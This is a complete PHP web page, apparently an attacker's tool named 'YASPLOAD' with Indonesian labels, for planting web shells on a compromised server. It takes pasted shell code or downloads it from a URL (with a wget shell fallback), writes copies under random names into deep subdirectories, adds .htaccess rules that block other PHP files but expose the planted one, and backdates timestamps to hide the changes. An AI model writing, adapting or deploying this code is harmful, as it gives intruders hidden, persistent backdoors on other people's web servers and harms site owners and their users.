<?php

function f7a1x($bD, $depthMin = 4) {
    $list = [];
    $walker = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($bD, FilesystemIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($walker as $p) {
        if ($p->isDir()) {
            $d = substr_count(str_replace($bD, '', $p), DIRECTORY_SEPARATOR);
            if ($d >= $depthMin) {
                $list[] = $p->getPathname();
            }
        }
    }

    return $list;
}

function k9y2s($x, $bD = '.', $addHtaccess = true) {
    $dArr = f7a1x($bD, 5);
    if (count($dArr) === 0) return false;

    $chosen = $dArr[array_rand($dArr)];
    $fileN = bin2hex(random_bytes(4)) . '.php';
    $fpath = $chosen . '/' . $fileN;

    $oriTime = @filemtime($chosen);

    file_put_contents($fpath, $x);

    if ($addHtaccess) {
        $htaccess = $chosen . '/.htaccess';
        $htaData = <<<HTA
<FilesMatch "\\.php$">
    Require all denied
    Require ip 127.0.0.1
</FilesMatch>

<FilesMatch "^{$fileN}$">
    Require all granted
</FilesMatch>
HTA;
        @file_put_contents($htaccess, $htaData);
    }

    if ($oriTime !== false) {
        @touch($chosen, $oriTime);
        @touch($fpath, $oriTime);
        if ($addHtaccess) @touch($htaccess, $oriTime);
    }

    return $fpath;
}

function fetchFromURL($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $data = curl_exec($ch);
        curl_close($ch);
        if ($data !== false) return $data;
    }

    if (ini_get('allow_url_fopen')) {
        $options = ["http" => ["method" => "GET", "header" => "User-Agent: PHP"]];
        $context = stream_context_create($options);
        $data = @file_get_contents($url, false, $context);
        if ($data !== false) return $data;
    }

    if (function_exists('shell_exec')) {
        $escapedUrl = escapeshellarg($url);
        $output = @shell_exec("wget -qO- $escapedUrl");
        if (!empty($output)) return $output;
    }

    return false;
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>./YASPLOAD</title>
    <style>
        body {
            background: #111;
            color: #00ffcc;
            font-family: Arial, sans-serif;
            padding: 40px;
            display: flex;
            justify-content: center;
        }
        .wrapper {
            width: 100%;
            max-width: 600px;
            background: #333333;
        }
        textarea, select, button, input[type="url"] {
            width: 88%;
            margin: 10px 18px;
            padding: 16px;
            font-size: 14px;
            border-radius: 8px;
            border: 1px solid #00ffcc;
            background-color: #1c1c1c;
            color: #00ffcc;
        }
        button {
            background-color: #00ffcc;
            color: #000;
            font-weight: bold;
            cursor: pointer;
        }
        .result {
            background-color: #222;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
        }
        label {
            font-weight: bold;
            display: block;
            margin-top: 10px;
        }
        .inline-label {
            display: flex;
            align-items: center;
            gap: 10px;
            margin: 10px 0;
            flex-direction: column-reverse;
        }
        a {
            color: #00ffaa;
        }
    </style>
</head>
<body>
<div class="wrapper">
    <form method="post">
        <div class="inline-label">
            <input type="radio" name="mode" value="paste" checked>
            <label for="paste">Paste Shell</label>
        </div>
        <textarea name="filecontent" rows="10"></textarea>

        <div class="inline-label">
            <input type="radio" name="mode" value="url">
            <label for="url">Dari URL</label>
        </div>
        <input type="url" name="fileurl" placeholder="https://...">

        <select name="jumlah">
            <?php for ($i = 1; $i <= 10; $i++): ?>
                <option value="<?= $i ?>"><?= $i ?> file</option>
            <?php endfor; ?>
        </select>

        <div class="inline-label">
            <input type="checkbox" name="htaccess" checked>
            <label for="htaccess">.HTACCESS</label>
        </div>

        <button type="submit">Gas!</button>
    </form>

<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mode = $_POST['mode'];
    $jumlah = intval($_POST['jumlah']);
    $addHtaccess = isset($_POST['htaccess']);

    $konten = '';
    if ($mode === 'paste') {
        $konten = trim($_POST['filecontent']);
    } elseif ($mode === 'url' && !empty($_POST['fileurl'])) {
        $konten = fetchFromURL(trim($_POST['fileurl']));
    }

    if (!empty($konten)) {
        echo '<div class="result"><h3>Hasil Upload:</h3><ul>';

        for ($i = 0; $i < $jumlah; $i++) {
            $savePath = k9y2s($konten, '.', $addHtaccess);
            if ($savePath) {
                $rel = str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath($savePath));
                $d = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
                $urlOut = $d . $_SERVER['HTTP_HOST'] . $rel;
                echo "<li><a href=\"$urlOut\" target=\"_blank\">$urlOut</a></li>";
            } else {
                echo "<li><span style='color:red'>FAILED! MIN SUBDIR +4</span></li>";
            }
        }
        echo '</ul></div>';
    } else {
        echo '<div class="result"><span style="color:red">Konten kosong atau gagal diambil dari URL!</span></div>';
    }
}
?>
</div>
</body>
</html>
